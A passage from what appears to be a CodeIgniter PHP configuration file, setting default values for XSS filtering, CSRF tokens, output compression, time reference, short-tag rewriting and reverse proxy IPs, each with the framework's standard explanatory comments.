$config['standardize_newlines'] = FALSE;

/*
|--------------------------------------------------------------------------
| Global XSS Filtering
|--------------------------------------------------------------------------
|
| Determines whether the XSS filter is always active when GET, POST or
| COOKIE data is encountered
|
| WARNING: This feature is DEPRECATED and currently available only
|          for backwards compatibility purposes!
|
*/
$config['global_xss_filtering'] = FALSE;

/*
|--------------------------------------------------------------------------
| Cross Site Request Forgery
|--------------------------------------------------------------------------
| Enables a CSRF cookie token to be set. When set to TRUE, token will be
| checked on a submitted form. If you are accepting user data, it is strongly
| recommended CSRF protection be enabled.
|
| 'csrf_token_name' = The token name
| 'csrf_cookie_name' = The cookie name
| 'csrf_expire' = The number in seconds the token should expire.
| 'csrf_regenerate' = Regenerate token on every submission
| 'csrf_exclude_uris' = Array of URIs which ignore CSRF checks
*/
$config['csrf_protection'] = FALSE;
$config['csrf_token_name'] = 'csrf_test_name';
$config['csrf_cookie_name'] = 'csrf_cookie_name';
$config['csrf_expire'] = 7200;
$config['csrf_regenerate'] = TRUE;
$config['csrf_exclude_uris'] = array();

/*
|--------------------------------------------------------------------------
| Output Compression
|--------------------------------------------------------------------------
|
| Enables Gzip output compression for faster page loads.  When enabled,
| the output class will test whether your server supports Gzip.
| Even if it does, however, not all browsers support compression
| so enable only if you are reasonably sure your visitors can handle it.
|
| Only used if zlib.output_compression is turned off in your php.ini.
| Please do not use it together with httpd-level output compression.
|
| VERY IMPORTANT:  If you are getting a blank page when compression is enabled it
| means you are prematurely outputting something to your browser. It could
| even be a line of whitespace at the end of one of your scripts.  For
| compression to work, nothing can be sent before the output buffer is called
| by the output class.  Do not 'echo' any values with compression enabled.
|
*/
$config['compress_output'] = FALSE;

/*
|--------------------------------------------------------------------------
| Master Time Reference
|--------------------------------------------------------------------------
|
| Options are 'local' or any PHP supported timezone. This preference tells
| the system whether to use your server's local time as the master 'now'
| reference, or convert it to the configured one timezone. See the 'date
| helper' page of the user guide for information regarding date handling.
|
*/
$config['time_reference'] = 'local';

/*
|--------------------------------------------------------------------------
| Rewrite PHP Short Tags
|--------------------------------------------------------------------------
|
| If your PHP installation does not have short tag support enabled CI
| can rewrite the tags on-the-fly, enabling you to utilize that syntax
| in your view files.  Options are TRUE or FALSE (boolean)
|
*/
$config['rewrite_short_tags'] = FALSE;


/*
|--------------------------------------------------------------------------
| Reverse Proxy IPs
|--------------------------------------------------------------------------
|
| If your server is behind a reverse proxy, you must whitelist the proxy
| IP addresses from which CodeIgniter should trust headers such as
| HTTP_X_FORWARDED_FOR and HTTP_CLIENT_IP in order to properly identify
| the visitor's IP address.
|
| You can use both an array or a comma-separated list of proxy addresses,
| as well as specifying whole subnets. Here are a few examples:
|
| Comma-separated:	'10.0.1.200,192.168.5.0/24'
| Array:		array('10.0.1.200', '192.168.5.0/24')
*/
$config['proxy_ips'] = '';
